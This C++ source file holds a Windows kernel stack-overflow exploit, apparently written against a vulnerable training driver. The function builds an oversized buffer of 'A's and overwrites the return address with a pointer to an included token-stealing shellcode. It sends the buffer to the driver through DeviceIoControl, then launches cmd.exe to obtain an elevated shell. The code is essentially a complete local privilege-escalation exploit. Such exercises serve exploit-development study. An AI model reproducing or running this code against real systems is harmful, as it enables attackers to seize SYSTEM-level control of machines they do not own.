#include "Solutions.h"
#include "ioctal_codes.h"
#include "TokenStealingShellcode.h"
#include <stdio.h>

DWORD Solutions::TriggerStackBufferOverflow() {
	DWORD dwBufSize = 0x820 + sizeof(DWORD);
	PUCHAR lpInBuffer = NULL;
	DWORD dwIoctl = IOCTL_STACK_OVERFLOW;
	DWORD dwBytesReturned = 0;

	wprintf(L"[+] Device Handle 0x%x\n", _hDeviceHandle);

	lpInBuffer = (PUCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufSize);

	if (!lpInBuffer) {
		wprintf(L"[!] Failed to allocate memory. %x\n", GetLastError());
		HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
		CloseHandle(_hDeviceHandle);
		return 1;
	}

	RtlFillMemory(lpInBuffer, dwBufSize - 4, 0x41); // fill buffer with 'A'

	lpInBuffer[0x820] = (DWORD)&tokenStealingShellcode & 0xFF;
	lpInBuffer[0x821] = ((DWORD)&tokenStealingShellcode & 0xFF00) >> 8;
	lpInBuffer[0x822] = ((DWORD)&tokenStealingShellcode & 0xFF0000) >> 16;
	lpInBuffer[0x823] = ((DWORD)&tokenStealingShellcode & 0xFF000000) >> 24;

	wprintf(L"[+] Sending IOCTL request with ioctl: 0x222003\n");
	wprintf(L"[+] Buffer size: 0x%x\n", dwBufSize);
	wprintf(L"[+] Jumping to shellcode 0x%x\n", (DWORD)&tokenStealingShellcode);

	if (!DeviceIoControl(_hDeviceHandle,
		dwIoctl,
		(LPVOID)lpInBuffer,
		dwBufSize, NULL, 0, &dwBytesReturned, NULL))
	{
		wprintf(L"[-] ERROR: %d - could not talk with the driver\n", GetLastError());
		HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
		CloseHandle(_hDeviceHandle);
		return 1;
	}

	wprintf(L"[+] Talked succesfully with the driver\n");

	system("cmd.exe");

	HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer);
	CloseHandle(_hDeviceHandle);
}